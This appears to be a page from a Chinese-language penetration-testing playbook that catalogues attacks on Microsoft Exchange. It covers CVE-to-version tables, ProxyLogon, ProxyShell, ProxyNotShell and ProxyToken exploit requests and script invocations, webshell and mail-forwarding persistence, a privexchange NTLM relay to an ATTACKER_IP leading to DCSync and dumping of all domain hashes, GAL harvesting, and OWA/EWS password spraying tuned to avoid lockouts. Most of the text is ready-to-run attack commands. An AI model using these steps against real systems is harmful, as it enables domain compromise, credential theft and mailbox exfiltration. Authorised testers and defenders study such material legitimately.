# 内网/后渗透 — Exchange 攻击 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ 渗透测试场景下大多受限,见 [../../compliance.md](../../compliance.md)
> 涵盖:版本-CVE映射 / ProxyLogon / ProxyShell / ProxyNotShell / ProxyToken / privexchange / GAL提取 / OWA密码喷射 / Exchange→DC

---

## Exchange 版本 ↔ CVE 速查表

Exchange 主版本号对应关系：

| 主版本 | Exchange 版本 | 常见 CVE |
|--------|-------------|---------|
| **15.0.x** | Exchange 2013 | CVE-2021-26855 (ProxyLogon), CVE-2021-34473 (ProxyShell), CVE-2021-42321 |
| **15.1.x** | Exchange 2016 | CVE-2021-26855, CVE-2021-34473, CVE-2021-31207, CVE-2022-41040 (ProxyNotShell), CVE-2021-27065 |
| **15.2.x** | Exchange 2019 | CVE-2021-26855, CVE-2021-34473, CVE-2022-41040 (ProxyNotShell), CVE-2023-21707, CVE-2024-21410 |

### ProxyShell 补丁与可利用版本

| 补丁级别 | 版本范围 | ProxyLogon | ProxyShell | ProxyNotShell |
|---------|---------|-----------|-----------|--------------|
| 未补丁 2021.3 | < 15.2.792.3 (2019) | ✅ | ✅ | ✅ |
| 2021.5 SU | 15.2.792.3 ~ 15.2.858.xx | ❌ | ✅ | ✅ |
| 2021.11 SU | 15.2.858.xx ~ 15.2.986.xx | ❌ | ❌ | ✅ |
| 2022.11 SU+ | > 15.2.1111.3 | ❌ | ❌ | ❌ |

### 版本探测方法

```
# 方法1：OWA 登录页
curl -k https://exchange.com/owa/auth/logon.aspx | findstr /i "version"

# 方法2：EWS 服务响应头
curl -k -H "Authorization: Negotiate TlRM..." https://exchange.com/ews/exchange.asmx -D headers.txt
# 响应头含 X-FEServer / X-CalculatedBETarget

# 方法3：Autodiscover
curl -k https://exchange.com/autodiscover/autodiscover.xml -D - 
# HTTP 头 X-DiagInfo 含版本

# 方法4：Outlook Anywhere (RPC over HTTP)
curl -k https://exchange.com/rpc/rpcproxy.dll -I
# Server 头含 Exchange/15.X.X.X
```

---

### ProxyLogon攻击  `proxylogon`
CVE-2021-26855 Exchange SSRF
子类：**ProxyLogon** · tags: `exchange` `proxylogon` `cve-2021-26855`

**前置条件：** Exchange可访问

**攻击链：**

**1. 探测漏洞**  _[linux]_
_检查Exchange版本_
```
curl -k https://exchange.com/owa/auth/x.js
检查Exchange版本
```

**2. 利用脚本**  _[linux]_
_利用ProxyLogon_
```
python proxylogon.py -u https://exchange.com -e admin@domain.com
获取管理员邮箱访问权限
```

**3. 手动利用**
_手动构造请求_
```
POST /owa/auth/x.js HTTP/1.1
Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;
X-ClientId=xxx

构造SSRF请求
```

---

### ProxyShell攻击  `proxyshell`
CVE-2021-34473 Exchange RCE
子类：**ProxyShell** · tags: `exchange` `proxyshell` `cve-2021-34473`

**前置条件：** Exchange可访问

**攻击链：**

**1. 探测漏洞**  _[linux]_
_探测漏洞_
```
curl -k "https://exchange.com/autodiscover/autodiscover.json?@foo.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3f@foo.com"
检查是否存在漏洞
```

**2. 利用脚本**  _[linux]_
_利用ProxyShell_
```
python proxyshell.py -u https://exchange.com -e admin@domain.com
获取邮箱访问并执行命令
```

**3. 获取邮件**
_访问邮箱_
```
GET /autodiscover/autodiscover.json?@domain.com/owa/?&Email=admin@domain.com HTTP/1.1
访问邮箱内容
```

---

### ProxyNotShell攻击  `proxynotshell`
CVE-2022-41040 Exchange SSRF + CVE-2022-41082 RCE
子类：**ProxyNotShell** · tags: `exchange` `proxynotshell` `cve-2022-41040` `cve-2022-41082`

**前置条件：** Exchange 2016 CU23 / 2019 CU12 之前版本；Exchange 可访问；需有效域用户凭据（不同于 ProxyShell 无需凭据）

**攻击链：**

**1. 版本确认**  _[linux]_

```
# Exchange 2016: < 15.1.2507.16
# Exchange 2019: < 15.2.1111.3
curl -k -u 'domain\user:password' https://exchange.com/owa/auth/x.js -D -
# 检查 X-FEServer / X-OWA-Version 头确认版本
```

**2. SSRF 触发点探测**  _[linux]_

```
# 关键端点（需凭据）
POST /autodiscover/autodiscover.json?@foo.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3f@foo.com HTTP/1.1
Host: exchange.com
Authorization: Basic <base64>

# 响应 200 + 含X-FEServer → 端点可用
```

**3. 利用脚本**  _[linux]_

```
# ProxyNotShell_public POC（需认证用户凭据）
python proxynotshell.py -u https://exchange.com -d domain.com -U user -P password -e target@domain.com

# 利用链：
# 1. SSRF 绕过 → 访问后端 /powershell
# 2. CVE-2022-41082 → Remote PowerShell 执行
# 3. 获取 shell → webshell 持久化或凭据窃取
```

**4. 手动利用（核心请求）**  _[linux]_

```
# Step 1：SSRF 到达后端 PowerShell
GET /autodiscover/autodiscover.json?@evil.com/powershell/remoteshell?X-CALC=1 HTTP/1.1
Host: exchange.com
Authorization: Basic <base64>

# Step 2：通过 PowerShell 写 webshell
# 或直接添加邮箱规则转发敏感信息
```

**与 ProxyShell 对比：**
| 特征 | ProxyShell (CVE-2021-34473) | ProxyNotShell (CVE-2022-41040) |
|------|--------------------------|------------------------------|
| 认证 | 不需要 | **需要**域用户凭据 |
| 利用难度 | 低 | 中（需有效凭据） |
| 影响版本 | Exchange 2013/2016/2019（2021.7 前补丁） | Exchange 2016 CU23 前 / 2019 CU12 前 |
| 利用稳定性 | 高 | 中（补丁广泛部署） |

---

### Exchange 提权到域控 (privexchange)  `exchange-privesc`
利用 Exchange 推送通知 → 触发 NTLM 回连 → 中继或 Relay 到 DC
子类：**privexchange** · tags: `exchange` `privexchange` `ntlm-relay` `exchange-to-dc`

**前置条件：** Exchange 服务器权限；Exchange 服务器通常有高权限（Exchange Trusted Subsystem / WriteDACL 到域对象）

**攻击链：**

**1. 确认 Exchange 权限**  _[windows]_

```
# Exchange 服务器在域中默认有高权限
whoami /groups | findstr /i "Exchange"
# Exchange Trusted Subsystem → WriteDACL 到域根对象
# Exchange Windows Permissions → 可写 AdminSDHolder
```

**2. 方式A：privexchange（推送通知滥用）**  _[linux]_

```
# Exchange 服务器权限 → 设置推送通知 → 触发 Exchange 回连攻击者
# Exchange 机器账户 → 默认有 WriteDACL 权限

# 攻击流程：
# 1. 中继服务器监听
impacket-ntlmrelayx -t ldaps://DC_IP --escalate-user CONTROLLED_USER -smb2support

# 2. 触发 Exchange 回连（在 Exchange 服务器上）
python privexchange.py -ah ATTACKER_IP -u user -p password exchange.com/user@EXCHANGE_SERVER

# 3. 中继 Exchange 机器账户 NTLM → LDAP → 赋予 CONTROLLED_USER DCSync 权限
# 成功后：
impacket-secretsdump domain.com/CONTROLLED_USER:'password'@DC_IP
```

**3. 方式B：直接利用 Exchange 权限写 DACL**  _[linux]_

```
# Exchange Windows Permissions 组成员 → WriteDACL 到域根
# 用 impacket dacledit.py 赋予 DCSync 权限
python3 dacledit.py -action 'write' -principal 'CONTROLLED_USER' -target 'DC=domain,DC=com' -rights DCSync domain.com/user:password -dc-ip DC_IP
```

**4. 验证**  _[linux]_

```
# DCSync 获取所有域用户 hash
impacket-secretsdump domain.com/CONTROLLED_USER@DC_IP -just-dc
```

---

### 全局通讯录(GAL)提取与用户枚举  `exchange-gal`
精确提取 Exchange GAL/OAB 获取域用户列表
子类：**GAL提取** · tags: `exchange` `gal` `oab` `user-enum`

**方法A：MailSniper（Windows，推荐）**

```
# 下载 OAB（Offline Address Book）
MailSniper.exe Get-GlobalAddressList -ExchangeHostname exchange.com -Username domain\user -Password password -OutputFile gal.txt

# OAB 通常含：名称、邮箱、部门、职位、电话号码

# 如果有 OWA 访问权限
MailSniper.exe Get-GlobalAddressList -OWAUrl https://exchange.com/owa -Username domain\user -Password password
```

**方法B：手动下载 OAB（无需凭据，旧版本）**

```
# OAB URL 通常在 Autodiscover 响应中
curl -k -u 'domain\user:password' https://exchange.com/autodiscover/autodiscover.xml
# 找到 <OABUrl> 标签 → 下载 OAB XML

# 解析 OAB 获取用户列表
curl -k -u 'domain\user:password' https://exchange.com/oab/.../oab.xml
```

**方法C：OAB URL 探测列表**

```
# 常见 OAB 路径
https://exchange.com/OAB/<GUID>/oab.xml
https://exchange.com/autodiscover/autodiscover.xml
https://exchange.com/owa/ev.owa2?ns=OAB&oabId=<GUID>
```

**方法D：EWS ResolveNames（通过 API）**

```
# 使用 exchanger.py（impacket）
python3 exchanger.py domain/user:password@exchange.com nspi list-users

# 或通过 EWS SOAP 请求 ResolveNames 逐个推断用户名
```

**GAL 在渗透中的价值：**
- 获得域用户完整列表 → 密码喷射的精准靶标
- 从部门/职位信息定位高价值目标（IT管理员/安全运维/域管理员）
- 发现服务账号命名规律

---

### NTLM 信息泄露 via Autodiscover  `exchange-ntlm-leak`
利用 Exchange Autodiscover 端点获取 NTLM 认证信息
子类：**NTLM泄露** · tags: `exchange` `ntlm` `autodiscover` `info-disclosure`

**攻击链：**

```
# 1. 无需凭据 → Autodiscover 要求 NTLM 认证
curl -k -v https://exchange.com/autodiscover/autodiscover.xml 2>&1 | findstr /i "www-authenticate"
# WWW-Authenticate: Negotiate
# WWW-Authenticate: NTLM  ← 确认 NTLM 可用

# 2. 触发 NTLM 挑战 → 提取域信息
# 从 Type-2 NTLM 消息中提取 NetBIOS 域名和 DNS 域名
curl -k -H "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" https://exchange.com/autodiscover/autodiscover.xml -D -
# 响应 WWW-Authenticate: NTLM TlRMTVNTUAAC... ← Base64 NTLM Type-2, 含域名信息

# 3. Autodiscover 返回含 Exchange 版本和内部服务器名
curl -k https://exchange.com/autodiscover/autodiscover.svc 2>&1
# 响应可能泄露内部主机名和 Exchange 版本
```

---

### OWA 密码喷射  `exchange-owa-spray`
基于 OWA 的高隐蔽性密码喷射
子类：**OWA喷射** · tags: `exchange` `owa` `password-spray` `lateral`

**攻击链：**

```
# 1. 测试用户枚举（通过 OWA 时间差）
curl -k -w "%{time_total}" https://exchange.com/owa/auth/owaauth.dll -d "destination=https://exchange.com/owa/&username=domain\\user&password=wrong" 2>/dev/null
# 有效用户 vs 无效用户 → 响应时间差异（~200ms vs ~50ms）

# 2. 密码喷射（OWA 端点是Exchange最暴露的认证入口）
# 推荐工具：MailSniper
MailSniper.exe PasswordSpray -OWAUrl https://exchange.com/owa -UserList users.txt -Password 'Spring2024!'
# 注意锁定策略：Exchange 默认无账户锁定但 AD 有
# 每次喷射间隔 ≥ 35 分钟，每轮最多 3-4 个密码

# 3. 另一种喷射端点：EWS
MailSniper.exe PasswordSpray -EWSUrl https://exchange.com/ews/exchange.asmx -UserList users.txt -Password 'Summer2024!'

# 4. 成功登录后的操作
# OWA → 查看邮件 → 邮件规则自动转发
# EWS → API 导出邮箱 → 搜索敏感关键词（密码/凭据/VPN/域管理）
```

---

### ProxyToken攻击  `exchange-proxytoken`
利用Exchange ProxyToken绕过认证
子类：**ProxyToken** · tags: `exchange` `proxytoken` `bypass`

**前置条件：** Exchange服务器；存在漏洞

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测漏洞_
```
使用ProxyToken工具:
python proxytoken.py -u https://exchange.com -e user@domain.com
检测是否存在漏洞
```

**2. 利用漏洞**  _[linux]_
_获取邮箱访问_
```
python proxytoken.py -u https://exchange.com -e user@domain.com -a
获取用户邮箱访问权限
```

**3. 访问邮箱**
_访问EWS接口_
```
curl -k https://exchange.com/ews/Exchange.asmx -H "X-ClientApplication: Test"
绕过认证访问EWS
```

---

### Exchange邮箱访问  `exchange-mailbox-access`
通过各种方式访问Exchange邮箱
子类：**邮箱访问** · tags: `exchange` `mailbox` `access`

**前置条件：** Exchange凭证或漏洞

**攻击链：**

**1. OWA访问**
_OWA Web访问_
```
https://exchange.com/owa
使用凭证登录OWA
查看邮件、日历等
```

**2. EWS访问**  _[linux]_
_EWS API访问_
```
使用Impacket:
python exchanger.py domain/user:password@exchange.com
或使用EWSTools
```

**3. Outlook MAPI**  _[windows]_
_Outlook客户端_
```
配置Outlook连接Exchange
使用MAPI协议访问邮箱
支持邮件、日历、联系人
```

**4. 导出邮箱**  _[windows]_
_导出邮箱_
```
PowerShell:
New-MailboxExportRequest -Mailbox user@domain.com -FilePath "\\server\share\user.pst"
导出邮箱为PST文件
```

---



---

← 回 [00-index.md](00-index.md) · 上一篇:[`17-persistence.md`](17-persistence.md) · 下一篇:[`19-adcs.md`](19-adcs.md)
